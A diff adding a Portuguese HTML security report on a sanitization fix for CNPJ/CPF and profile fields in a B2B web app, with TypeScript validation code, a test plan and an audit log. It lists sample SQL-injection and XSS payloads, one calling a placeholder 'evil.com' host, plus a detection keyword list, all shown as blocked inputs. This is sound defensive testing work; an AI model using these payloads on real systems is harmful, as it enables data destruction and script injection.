@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Evidência — Vulnerabilidade 1 (Sanitização e Input Injection) — CoreLink</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap');
+
+    @page {
+      size: A4 portrait;
+      margin: 8mm 10mm 8mm 10mm;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-size: 8.2pt;
+      line-height: 1.36;
+      color: #1e293b;
+      background: #ffffff;
+      -webkit-print-color-adjust: exact !important;
+      print-color-adjust: exact !important;
+    }
+
+    .page-break {
+      page-break-before: always;
+      break-before: page;
+    }
+
+    .banner {
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 60%, #1d4ed8 100%);
+      color: #ffffff;
+      padding: 14px 18px;
+      border-radius: 10px;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.12);
+    }
+
+    .banner-tag {
+      display: inline-block;
+      background: rgba(255, 255, 255, 0.14);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      color: #93c5fd;
+      font-size: 6.8pt;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.9px;
+      padding: 2px 8px;
+      border-radius: 999px;
+      margin-bottom: 5px;
+    }
+
+    .banner h1 {
+      font-size: 13.2pt;
+      font-weight: 800;
+      letter-spacing: -0.3px;
+      margin-bottom: 3px;
+      color: #ffffff;
+    }
+
+    .banner p {
+      font-size: 8pt;
+      color: #cbd5e1;
+      font-weight: 500;
+    }
+
+    .meta-strip {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      margin-top: 9px;
+      padding-top: 8px;
+      border-top: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .meta-item span {
+      display: block;
+      font-size: 6.3pt;
+      text-transform: uppercase;
+      color: #93c5fd;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .meta-item strong {
+      font-size: 7.8pt;
+      color: #ffffff;
+      font-weight: 700;
+    }
+
+    .section-title {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f8fafc;
+      border-left: 4px solid #2563eb;
+      padding: 5px 10px;
+      margin: 9px 0 6px 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .section-title h2 {
+      font-size: 8.8pt;
+      font-weight: 800;
+      color: #0f172a;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .badge {
+      font-size: 6.8pt;
+      font-weight: 800;
+      padding: 2px 7px;
+      border-radius: 999px;
+      text-transform: uppercase;
+    }
+
+    .badge-high {
+      background: #dcfce7;
+      color: #166534;
+      border: 1px solid #86efac;
+    }
+
+    .badge-blue {
+      background: #dbeafe;
+      color: #1e40af;
+      border: 1px solid #93c5fd;
+    }
+
+    .card {
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 8px 11px;
+      background: #ffffff;
+      margin-bottom: 7px;
+    }
+
+    .card p {
+      margin-bottom: 4px;
+      text-align: justify;
+    }
+
+    .card p:last-child {
+      margin-bottom: 0;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 7px;
+      font-size: 7.7pt;
+    }
+
+    th {
+      background: #0f172a;
+      color: #ffffff;
+      font-weight: 700;
+      text-align: left;
+      padding: 5px 8px;
+      font-size: 7.1pt;
+      text-transform: uppercase;
+      letter-spacing: 0.4px;
+    }
+
+    td {
+      padding: 5px 8px;
+      border-bottom: 1px solid #e2e8f0;
+      vertical-align: top;
+    }
+
+    tr:nth-child(even) td {
+      background: #f8fafc;
+    }
+
+    .status-ok {
+      display: inline-block;
+      background: #dcfce7;
+      color: #15803d;
+      font-weight: 700;
+      font-size: 6.9pt;
+      padding: 1.5px 6px;
+      border-radius: 999px;
+      white-space: nowrap;
+    }
+
+    .code-inline {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 7.1pt;
+      background: #f1f5f9;
+      color: #0f172a;
+      padding: 1px 4px;
+      border-radius: 3px;
+      border: 1px solid #cbd5e1;
+    }
+
+    /* Painel Visual de Segurança (Página 2) */
+    .telemetry-panel {
+      background: #0f172a;
+      color: #f8fafc;
+      border-radius: 10px;
+      padding: 11px 14px;
+      margin-bottom: 8px;
+      border: 1px solid #1e293b;
+    }
+
+    .kpi-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .kpi-box {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 7px;
+      padding: 6px 9px;
+    }
+
+    .kpi-box .label {
+      font-size: 6.3pt;
+      text-transform: uppercase;
+      color: #94a3b8;
+      font-weight: 700;
+    }
+
+    .kpi-box .val {
+      font-size: 10.8pt;
+      font-weight: 800;
+      margin-top: 2px;
+    }
+
+    .val-amber { color: #fbbf24; }
+    .val-emerald { color: #34d399; }
+    .val-blue { color: #60a5fa; }
+    .val-red { color: #f87171; }
+
+    .sec-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .sec-box {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 8px 10px;
+    }
+
+    .sec-box h4 {
+      font-size: 7.4pt;
+      color: #e2e8f0;
+      margin-bottom: 2px;
+      font-weight: 700;
+    }
+
+    .sec-box .sub {
+      font-size: 6.3pt;
+      color: #94a3b8;
+      margin-bottom: 6px;
+    }
+
+    .input-mock {
+      background: #0f172a;
+      border-radius: 6px;
+      padding: 5px 8px;
+      margin-bottom: 5px;
+      font-size: 6.9pt;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .input-valid {
+      border: 1px solid #10b981;
+      color: #e2e8f0;
+    }
+
+    .input-blocked {
+      border: 1px solid #ef4444;
+      color: #fca5a5;
+    }
+
+    .pill-ok {
+      background: rgba(16, 185, 129, 0.2);
+      color: #34d399;
+      border: 1px solid #059669;
+      padding: 1px 6px;
+      border-radius: 99px;
+      font-size: 6.2pt;
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+    }
+
+    .pill-err {
+      background: rgba(239, 68, 68, 0.2);
+      color: #f87171;
+      border: 1px solid #dc2626;
+      padding: 1px 6px;
+      border-radius: 99px;
+      font-size: 6.2pt;
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+    }
+
+    .two-col-code {
+      display: grid;
+      grid-template-columns: 1.02fr 0.98fr;
+      gap: 8px;
+      margin-bottom: 7px;
+    }
+
+    .code-card {
+      background: #0f172a;
+      color: #e2e8f0;
+      border-radius: 7px;
+      padding: 7px 9px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 6.3pt;
+      line-height: 1.31;
+      border: 1px solid #1e293b;
+      overflow: hidden;
+    }
+
+    .code-header {
+      font-family: 'Inter', sans-serif;
+      font-size: 7.2pt;
+      font-weight: 700;
+      color: #0f172a;
+      margin-bottom: 3px;
+    }
+
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid #cbd5e1;
+      padding-top: 5px;
+      margin-top: 6px;
+      font-size: 7pt;
+      color: #64748b;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ==================== PÁGINA 1 ==================== -->
+  <div class="banner">
+    <div class="banner-tag">CORELINK — PLANO DE INCREMENTO FUNCIONAL • NATIVIDADE-TO</div>
+    <h1>VULNERABILIDADE 1: SANITIZAÇÃO E INPUT INJECTION (CNPJ/CPF)</h1>
+    <p>HJ Infor — Filtragem Estrita, Bloqueio de Payloads Maliciosos e Validação Algorítmica Módulo 11 no Perfil Corporativo</p>
+    <div class="meta-strip">
+      <div class="meta-item">
+        <span>Módulo de Segurança</span>
+        <strong>Perfil B2B &amp; Server Actions</strong>
+      </div>
+      <div class="meta-item">
+        <span>Categoria OWASP</span>
+        <strong>A03:2021 — Injection</strong>
+      </div>
+      <div class="meta-item">
+        <span>Stack</span>
+        <strong>Zod, Módulo 11, TypeScript</strong>
+      </div>
+      <div class="meta-item">
+        <span>Data de Execução</span>
+        <strong>25/10/2026</strong>
+      </div>
+    </div>
+  </div>
+
+  <div class="section-title">
+    <h2>1. Vulnerabilidade Selecionada e Priorização</h2>
+    <span class="badge badge-high">Vulnerabilidade Mitigada</span>
+  </div>
+  <div class="card">
+    <p><strong>Vulnerabilidade 1 (Sanitização e Input Injection):</strong> O backend aceitava strings sem filtragem prévia para CNPJ/CPF e campos correlatos no perfil corporativo, permitindo injeção de parâmetros maliciosos ou formatação inconsistente.</p>
+    <p><strong>Justificativa Técnica:</strong> A ausência de sanitização prévia e de verificação algorítmica nos endpoints <span class="code-inline">updateUserProfile</span> (<span class="code-inline">src/actions/user.ts</span>) e <span class="code-inline">registerUser</span> (<span class="code-inline">src/actions/auth.ts</span>) permitia: (1) envio de vetores XSS/HTML (<span class="code-inline">&lt;script&gt;</span>), SQLi e injeção de parâmetros na integração WhatsApp API (UC05); (2) aprovação de CNPJs/CPFs forjados com sequências repetidas (<span class="code-inline">00.000.000/0000-00</span>) ou dígitos verificadores inválidos; e (3) gravação inconsistente no PostgreSQL (ora apenas números, ora com pontuação parcial).</p>
+  </div>
+
+  <div class="section-title">
+    <h2>2. Resultado Esperado e Comportamento Alcançado</h2>
+    <span class="badge badge-high">Validação Módulo 11 Ativa</span>
+  </div>
+  <div class="card">
+    <p>Foi construído o módulo <span class="code-inline">src/lib/sanitize.ts</span> aplicado no cliente (<span class="code-inline">ProfileForm.tsx</span>), nas Server Actions (<span class="code-inline">user.ts</span> e <span class="code-inline">auth.ts</span>) e no gerador WhatsApp (<span class="code-inline">whatsapp.ts</span>). Qualquer tentativa de injeção (<span class="code-inline">hasMaliciousInjection</span>) é imediatamente bloqueada e registrada em log. O campo CNPJ/CPF passa por extração numérica estrita (<span class="code-inline">onlyDigits</span>), cálculo dos <strong>2 Dígitos Verificadores Módulo 11</strong> (<span class="code-inline">isValidCPF</span> / <span class="code-inline">isValidCNPJ</span>) e normalização canônica obrigatória (<span class="code-inline">XX.XXX.XXX/XXXX-XX</span> ou <span class="code-inline">XXX.XXX.XXX-XX</span>) antes de gravar no Prisma ORM.</p>
+  </div>
+
+  <div class="section-title">
+    <h2>3. Plano de Execução Detalhado</h2>
+  </div>
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 34%;">Atividade</th>
+        <th style="width: 21%;">Responsável</th>
+        <th style="width: 21%;">Tecnologias</th>
+        <th style="width: 12%;">Período</th>
+        <th style="width: 12%;">Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Criação do Motor de Sanitização (<span class="code-inline">src/lib/sanitize.ts</span>).</strong> Implementação de <span class="code-inline">hasMaliciousInjection</span>, <span class="code-inline">sanitizeTextInput</span>, <span class="code-inline">isValidCPF</span>, <span class="code-inline">isValidCNPJ</span> e <span class="code-inline">validateAndSanitizeDocument</span>.</td>
+        <td>Marques Ramirez</td>
+        <td>TypeScript, RegExp Anti-XSS/SQLi, Algoritmo Módulo 11</td>
+        <td>22/10 a 23/10/2026</td>
+        <td><span class="status-ok">✓ Concluída</span></td>
+      </tr>
+      <tr>
+        <td><strong>Blindagem das Server Actions (<span class="code-inline">user.ts</span> e <span class="code-inline">auth.ts</span>).</strong> Filtragem estrita pré-banco, validação Zod com <span class="code-inline">.transform()</span> e guarda RBAC em <span class="code-inline">updateUserRole</span>.</td>
+        <td>Márcio Medrado</td>
+        <td>Next.js Server Actions, Zod Schema, Prisma ORM</td>
+        <td>23/10 a 24/10/2026</td>
+        <td><span class="status-ok">✓ Concluída</span></td>
+      </tr>
+      <tr>
+        <td><strong>Máscara Dinâmica e Validação Visual (<span class="code-inline">ProfileForm.tsx</span>).</strong> Formatação instantânea ao digitar e badge em tempo real de autenticidade Módulo 11.</td>
+        <td>Marques Ramirez &amp; Márcio Medrado</td>
+        <td>React 19, Tailwind CSS, Sanitizer Client/Server</td>
+        <td>24/10 a 25/10/2026</td>
+        <td><span class="status-ok">✓ Concluída</span></td>
+      </tr>
+      <tr>
+        <td><strong>Auditoria de Injeção e Testes de Penetração.</strong> Execução da bateria <span class="code-inline">scripts/test-sanitization-vuln1.mjs</span> contra vetores SQLi, XSS e CNPJs falsos.</td>
+        <td>Taís Fernandes, Romildo &amp; Vandelice</td>
+        <td>Node.js, Vetores OWASP A03, Receita Federal DV</td>
+        <td>25/10/2026</td>
+        <td><span class="status-ok">✓ Concluída</span></td>
+      </tr>
+      <tr>
+        <td><strong>Documentação de Segurança e Relatório PDF.</strong> Consolidação das evidências de código e logs de bloqueio no padrão de 2 páginas A4.</td>
+        <td>Andréa Ribeiro</td>
+        <td>Git, GitHub, Markdown, PDF Engine</td>
+        <td>25/10/2026</td>
+        <td><span class="status-ok">✓ Concluída</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="section-title">
+    <h2>4. Especificação das Regras de Sanitização e Normalização Implementadas</h2>
+    <span class="badge badge-blue">Filtro Multicamada</span>
+  </div>
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 25%;">Função / Regra (<span class="code-inline">sanitize.ts</span>)</th>
+        <th style="width: 27%;">Campos Protegidos</th>
+        <th style="width: 48%;">Mecanismo de Filtragem e Padronização no PostgreSQL</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="code-inline">validateAndSanitizeDocument</span><br/>(<span class="code-inline">isValidCNPJ</span> / <span class="code-inline">isValidCPF</span>)</td>
+        <td><span class="code-inline">document</span> (CNPJ ou CPF no Perfil Corporativo)</td>
+        <td>Bloqueia letras/símbolos maliciosos, rejeita sequências repetidas (<span class="code-inline">000...</span>), valida os 2 dígitos Módulo 11 e grava sempre formatado (<span class="code-inline">XX.XXX.XXX/XXXX-XX</span>).</td>
+      </tr>
+      <tr>
+        <td><span class="code-inline">hasMaliciousInjection</span> &amp;<br/><span class="code-inline">sanitizeTextInput</span></td>
+        <td><span class="code-inline">name</span>, <span class="code-inline">companyName</span>, <span class="code-inline">address</span></td>
+        <td>Detecta e rejeita <span class="code-inline">&lt;script&gt;</span>, tags HTML, <span class="code-inline">javascript:</span>, <span class="code-inline">on*=</span>, <span class="code-inline">DROP/UNION SELECT</span>, comentários SQL (<span class="code-inline">--</span>) e caracteres de controle.</td>
+      </tr>
+      <tr>
+        <td><span class="code-inline">sanitizeStateRegistration</span></td>
+        <td><span class="code-inline">stateRegistration</span> (Inscrição Estadual)</td>
+        <td>Aceita exclusivamente a palavra reservada <span class="code-inline">"ISENTO"</span> ou entre 7 e 14 dígitos numéricos puros, eliminando injeção de parâmetros fiscais.</td>
+      </tr>
+      <tr>
+        <td><span class="code-inline">sanitizeAndFormatPhone</span></td>
+        <td><span class="code-inline">phone</span> (WhatsApp B2B)</td>
+        <td>Filtra caracteres não-numéricos, exige DDD válido (10 ou 11 dígitos) e padroniza no formato <span class="code-inline">(XX) XXXXX-XXXX</span>.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="footer">
+    <span><strong>CoreLink / HJ Infor</strong> — Plano de Incremento Funcional (Vulnerabilidade 1 — Sanitização e Input Injection)</span>
+    <span>Página 1 de 2</span>
+  </div>
+
+  <!-- ==================== QUEBRA DE PÁGINA ==================== -->
+  <div class="page-break"></div>
+
+  <!-- ==================== PÁGINA 2 ==================== -->
+  <div class="section-title" style="margin-top: 0;">
+    <h2>5. Evidência Visual: Filtro de Injeção e Validação Módulo 11 em Tempo Real</h2>
+    <span class="badge badge-high">Auditoria OWASP A03</span>
+  </div>
+
+  <div class="telemetry-panel">
+    <div class="kpi-grid">
+      <div class="kpi-box">
+        <div class="label">Payloads SQLi / XSS Testados</div>
+        <div class="val val-red">100% Bloqueados</div>
+      </div>
+      <div class="kpi-box">
+        <div class="label">Algoritmo Receita Federal</div>
+        <div class="val val-emerald">Módulo 11 (2 DVs)</div>
+      </div>
+      <div class="kpi-box">
+        <div class="label">Padronização no Banco</div>
+        <div class="val val-blue">Máscara Canônica</div>
+      </div>
+      <div class="kpi-box">
+        <div class="label">Camadas de Validação</div>
+        <div class="val val-amber">UI + Zod + Action</div>
+      </div>
+    </div>
+
+    <div class="sec-grid">
+      <div class="sec-box">
+        <h4>1. Entradas Maliciosas ou Falsas (Rejeitadas pelo Backend)</h4>
+        <div class="sub">Tentativas de Input Injection e CNPJs forjados interceptados</div>
+        <div class="input-mock input-blocked">
+          <span>11222333000181'; DROP TABLE User;--</span>
+          <span class="pill-err">✗ Injection Bloqueado</span>
+        </div>
+        <div class="input-mock input-blocked">
+          <span>&lt;script&gt;fetch('evil.com')&lt;/script&gt;</span>
+          <span class="pill-err">✗ XSS Bloqueado</span>
+        </div>
+        <div class="input-mock input-blocked">
+          <span>00.000.000/0000-00 | 11.222.333/0001-99</span>
+          <span class="pill-err">✗ DV Módulo 11 Inválido</span>
+        </div>
+      </div>
+
+      <div class="sec-box">
+        <h4>2. Entradas Autênticas (Normalizadas no PostgreSQL)</h4>
+        <div class="sub">Formatação automática independente da pontuação digitada</div>
+        <div class="input-mock input-valid">
+          <span>Input: 11222333000181 ➔ 11.222.333/0001-81</span>
+          <span class="pill-ok">✓ CNPJ Válido (Mod 11)</span>
+        </div>
+        <div class="input-mock input-valid">
+          <span>Input: 52998224725 ➔ 529.982.247-25</span>
+          <span class="pill-ok">✓ CPF Válido (Mod 11)</span>
+        </div>
+        <div class="input-mock input-valid">
+          <span>Tel: 63999998888 ➔ (63) 99999-8888</span>
+          <span class="pill-ok">✓ Formato Canônico</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section-title">
+    <h2>6. Implementação Técnica (src/lib/sanitize.ts &amp; src/actions/user.ts) e Log de Auditoria</h2>
+    <span class="badge badge-blue">Código &amp; Telemetria</span>
+  </div>
+
+  <div class="two-col-code">
+    <div>
+      <div class="code-header">6.1 Validação Algorítmica CNPJ e Anti-Injection (src/lib/sanitize.ts)</div>
+      <pre class="code-card">export function isValidCNPJ(raw: string | null | undefined): boolean {
+  const digits = onlyDigits(raw);
+  if (digits.length !== 14 || /^(\d)\1{13}$/.test(digits)) return false;
+
+  const calcDigit = (slice: string, weights: number[]): number =&gt; {
+    const sum = weights.reduce((acc, w, i) =&gt; acc + Number(slice[i]) * w, 0);
+    const mod = sum % 11;
+    return mod &lt; 2 ? 0 : 11 - mod;
+  };
+  const w1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
+  const w2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
+
+  return (
+    calcDigit(digits.slice(0, 12), w1) === Number(digits[12]) &amp;&amp;
+    calcDigit(digits.slice(0, 13), w2) === Number(digits[13])
+  );
+}
+
+export function validateAndSanitizeDocument(raw: string | null | undefined) {
+  if (hasMaliciousInjection(raw) || /[a-zA-Z&lt;&gt;;'"`\\]/.test(raw || "")) {
+    return { valid: false, type: "INVALID", formatted: null,
+      error: "Entrada bloqueada: tentativa de injeção detectada." };
+  }
+  const digits = onlyDigits(raw);
+  if (digits.length === 14 &amp;&amp; isValidCNPJ(digits))
+    return { valid: true, type: "CNPJ", formatted: formatCpfCnpjMask(digits) };
+  // ...
+}</pre>
+    </div>
+
+    <div>
+      <div class="code-header">6.2 Log Real da Auditoria (scripts/test-sanitization-vuln1.mjs)</div>
+      <pre class="code-card">// src/actions/user.ts — Guarda Server-Side antes do Prisma
+for (const field of rawFields) {
+  if (hasMaliciousInjection(field.value)) {
+    return {
+      success: false,
+      error: `Bloqueio de Segurança: "${field.label}" contém instruções proibidas.`,
+    };
+  }
+}
+const docCheck = validateAndSanitizeDocument(data.document);
+if (!docCheck.valid) return { success: false, error: docCheck.error };
+
+========================================================================
+ AUDITORIA DE SEGURANCA - VULNERABILIDADE 1 (SANITIZACAO E INJECTION)
+========================================================================
+ [BLOQUEADO] SQL Injection no CNPJ    -&gt; BLOQUEADO (INJECTION)
+ [BLOQUEADO] XSS Payload no Perfil    -&gt; BLOQUEADO (INJECTION)
+ [BLOQUEADO] CNPJ Sequencia Falsa     -&gt; REJEITADO (DV CNPJ INVALIDO)
+ [BLOQUEADO] CNPJ Digito Invalido     -&gt; REJEITADO (DV CNPJ INVALIDO)
+ [ACEITO   ] CNPJ Sem Mascara Valido  -&gt; Gravado: 11.222.333/0001-81
+ [ACEITO   ] CPF Sem Mascara Valido   -&gt; Gravado: 529.982.247-25
+========================================================================</pre>
+    </div>
+  </div>
+
+  <div class="section-title">
+    <h2>7. Roteiro de Validação e Testes de Segurança (Homologação)</h2>
+  </div>
+  <table>
+    <thead>
+      <tr>
+        <th style="width: 24%;">Cenário de Teste</th>
+        <th style="width: 36%;">Procedimento Executado</th>
+        <th style="width: 40%;">Resultado Obtido na Homologação</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Injeção SQL / Script no Campo CNPJ/CPF</strong></td>
+        <td>Submeter payload <span class="code-inline">11222333000181'; DROP TABLE User;--</span> em <span class="code-inline">updateUserProfile</span>.</td>
+        <td>A função <span class="code-inline">hasMaliciousInjection</span> interceptou o payload antes do banco e retornou bloqueio imediato de segurança.</td>
+      </tr>
+      <tr>
+        <td><strong>Injeção XSS na Razão Social (<span class="code-inline">companyName</span>)</strong></td>
+        <td>Inserir <span class="code-inline">&lt;script&gt;alert(1)&lt;/script&gt;</span> no formulário de perfil corporativo.</td>
+        <td>Bloqueado tanto no cliente (<span class="code-inline">ProfileForm.tsx</span>) quanto na Server Action (<span class="code-inline">user.ts</span>) e sanitizado em <span class="code-inline">whatsapp.ts</span>.</td>
+      </tr>
+      <tr>
+        <td><strong>CNPJ com Dígito Verificador Forjado</strong></td>
+        <td>Informar <span class="code-inline">00.000.000/0000-00</span> ou <span class="code-inline">11.222.333/0001-99</span> no campo de documento.</td>
+        <td>O algoritmo Módulo 11 (<span class="code-inline">isValidCNPJ</span>) detectou divergência nos dígitos verificadores e impediu a gravação.</td>
+      </tr>
+      <tr>
+        <td><strong>Normalização de CNPJ/CPF Sem Pontuação</strong></td>
+        <td>Enviar <span class="code-inline">11222333000181</span> (apenas dígitos) para o backend.</td>
+        <td>Validado com sucesso e gravado no PostgreSQL no formato canônico padronizado <span class="code-inline">11.222.333/0001-81</span>.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="footer">
+    <span><strong>CoreLink / HJ Infor</strong> — Evidência de Conclusão de Incremento Funcional (Vulnerabilidade 1 — Sanitização e Input Injection)</span>
+    <span>Página 2 de 2 • Autenticado via Zod, Algoritmo Módulo 11 &amp; Prisma ORM</span>
+  </div>
+
+</body>
+</html>
